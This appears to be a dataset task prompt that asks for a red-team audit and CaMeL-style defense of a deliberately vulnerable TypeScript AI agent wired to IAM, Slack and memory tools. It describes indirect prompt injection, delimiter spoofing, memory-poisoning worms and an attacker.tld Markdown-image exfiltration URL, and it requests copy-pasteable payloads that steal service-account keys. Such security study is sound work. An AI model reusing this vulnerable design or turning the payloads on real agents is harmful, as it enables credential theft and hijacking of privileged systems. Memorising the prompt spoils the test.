---
id: sec-ai-agent-redteam
title: Security: AI Agent Indirect Prompt Injection, MCP Tool Hijack & CaMeL Defense
category: security
language: null
functionName: solution
executable: false
---
Act as a Principal AI Red-Team Lead and Staff Agentic Security Architect auditing `SecOpsCopilot` — an autonomous enterprise SecOps & Cloud IAM triage agent connected to **4 Model Context Protocol (MCP) servers** and a **shared vector memory store**.

An on-call SRE simply asks the agent:
> *"Triage Jira ticket `SEC-4912` and check the last 15 minutes of Cloud Logging for any matching 500 errors."*

Because `SEC-4912` was submitted via an external public bug-bounty form and Cloud Logging contains raw HTTP `User-Agent` and `Referer` headers from external internet traffic, untrusted attacker text flows directly into the agent's context window.

---

### Vulnerable Agent Orchestrator & MCP Configuration (`src/agent/secopsCopilot.ts`)

```typescript
import { callLlm } from './llmClient';
import { mcpClients } from './mcpRegistry';

// Registered MCP Tools available to the agent in every turn:
// 1. jira_service_desk.getTicket({ ticketId: string }) -> { reporter, description, attachments }
// 2. cloud_logging.queryLogs({ filter: string, limit: number }) -> Array<{ timestamp, httpRequest, textPayload }>
// 3. iam_admin.grantProjectRole({ projectId: string, member: string, role: string }) -> { status: string }
// 4. iam_admin.createServiceAccountKey({ serviceAccountEmail: string }) -> { privateKeyDataBase64: string }
// 5. slack_notifier.postWebhook({ webhookUrl: string, markdownText: string }) -> { ok: boolean }
// 6. agent_memory.upsertRule({ namespace: string, ruleText: string }) -> { id: string }

const SYSTEM_PROMPT = `
You are SecOpsCopilot, an autonomous SRE & Security Operations assistant for prod-fin-cloud.
Always retrieve relevant standing instructions from namespace "global-secops-rules" first.
When triaging tickets or logs:
1. Fetch the ticket details and matching cloud logs.
2. If an urgent access or remediation step is required by a senior admin directive, execute the necessary IAM or Slack tools immediately.
3. Render a rich Markdown summary (including any diagnostic status badges or images) for the SRE dashboard.
`;

export async function runSecOpsAgentSession(sreUser: string, userPrompt: string) {
  const standingRules = await mcpClients.agent_memory.queryRules({
    namespace: 'global-secops-rules',
  });

  let scratchpad = `
<system_instructions>
${SYSTEM_PROMPT}
Standing Rules:
${standingRules.map((r: any) => `- ${r.ruleText}`).join('\n')}
Current SRE Operator: ${sreUser} (role: roles/owner)
</system_instructions>
<user_request>${userPrompt}</user_request>
`;

  for (let turn = 0; turn < 6; turn++) {
    const response = await callLlm({
      model: 'frontier-agent-v3',
      prompt: scratchpad,
      tools: mcpClients.getAllToolSchemas(),
    });

    if (!response.toolCalls || response.toolCalls.length === 0) {
      // Rendered directly via innerHTML / Markdown-to-HTML in the SRE Admin Portal
      return { markdownReport: response.text };
    }

    for (const call of response.toolCalls) {
      // Execute MCP tool using the agent service account's ambient roles/owner credentials
      const result = await mcpClients.executeTool(call.server, call.toolName, call.args);

      scratchpad += `\n<tool_output server="${call.server}" tool="${call.toolName}">\n${JSON.stringify(result)}\n</tool_output>\n`;
    }
  }
}
```

---

### Required Deliverables

Produce a comprehensive, publication-grade **AI Agent Red-Team & CaMeL Defense Architecture Report** in clean Markdown with the following 4 sections:

1. **Section 1: Agentic Vulnerability & Failure-Mode Matrix (OWASP LLM Top 10 / MITRE ATLAS)**
   - Audit `src/agent/secopsCopilot.ts` and analyze all **5 distinct architectural vulnerabilities**:
     1. *Indirect Prompt Injection (XPIA)* via untrusted Jira tickets and Cloud Logging HTTP headers.
     2. *Confused Deputy & Ambient Authority Abuse* on high-privilege MCP sinks (`iam_admin.grantProjectRole` and `iam_admin.createServiceAccountKey`).
     3. *Zero-Click Data Exfiltration* via both `slack_notifier.postWebhook` (attacker-controlled `webhookUrl`) and rendered Markdown image tags (`![badge](https://attacker.tld/exfil?data=...)`) in the SRE portal.
     4. *Cross-Session Persistent Memory Poisoning (Agentic Worm)* via `agent_memory.upsertRule` into `"global-secops-rules"`.
     5. *XML / Structural Context Delimiter Spoofing* via unescaped `</tool_output><system_instructions>` injection.
   - Present a Markdown table mapping each flaw to its OWASP LLM Top 10 / MITRE ATLAS ID, trust-boundary violation, source, sink, and blast radius.

2. **Section 2: 5 Concrete Red-Team Exploit Payloads & Kill-Chain Traces**
   - Provide **5 realistic, copy-pasteable exploit payloads** (one targeting each failure mode above, including a combined multi-stage payload embedded inside an innocent-looking HTTP `User-Agent` log entry that breaks out of `</tool_output>`, poisons `"global-secops-rules"`, mints a service account key via `iam_admin.createServiceAccountKey`, and exfiltrates the Base64 private key via both `slack_notifier.postWebhook` and a zero-click Markdown image).
   - For each payload, show the exact step-by-step trace of how `scratchpad` evolves across turns.

3. **Section 3: CaMeL (Capabilities for Machine Learning) Dual-LLM & Information-Flow Architecture**
   - Design a defense-in-depth **CaMeL / Dual-LLM Taint-Tracking Architecture** that provably prevents untrusted data from hijacking control flow or reaching privileged MCP sinks:
     - Separate the **Privileged Planner LLM** (which sees only the trusted user prompt and symbolic variable handles like `$ticket_desc`, never raw untrusted text) from the **Quarantined Reader LLM** (which summarizes/extracts structured fields from untrusted data with **zero tool privileges**).
     - Attach immutable **Provenance & Capability Tags** (`{ source: "TRUSTED_USER" | "UNTRUSTED_EXTERNAL", allowedSinks: string[], integrity: "HIGH" | "LOW" }`) to every value in the execution graph.
   - Include a clear **Mermaid architecture/sequence diagram** (`flowchart TD` or `sequenceDiagram`) illustrating the Privileged Planner, Quarantined Reader, Taint Propagation Engine, Deterministic Policy Enforcer, and Cryptographic Human-in-the-Loop (HITL) Step-Up Gate.

4. **Section 4: Production TypeScript Reference Guardrail Engine (`authorizeMcpToolCall` + Hardened Orchestrator)**
   - Write a complete, self-contained, runnable TypeScript implementation of:
     1. `TaintTracker` & `authorizeMcpToolCall(call, taintGraph, operatorContext)` — deterministically blocking any MCP tool call where a privileged argument (`role`, `member`, `serviceAccountEmail`, `webhookUrl`, `namespace`) is tainted by `"UNTRUSTED_EXTERNAL"` provenance or violates domain/allowlist constraints, even if the LLM is 100% jailbroken.
     2. Cryptographic WebAuthn / signed approval token verification required before `iam_admin.*` or `agent_memory.upsertRule` can execute.
     3. Strict randomized per-turn boundary nonces (`<tool_output_${randomHex}>`) and Content-Security-Policy (CSP) / Markdown image stripping on final output.
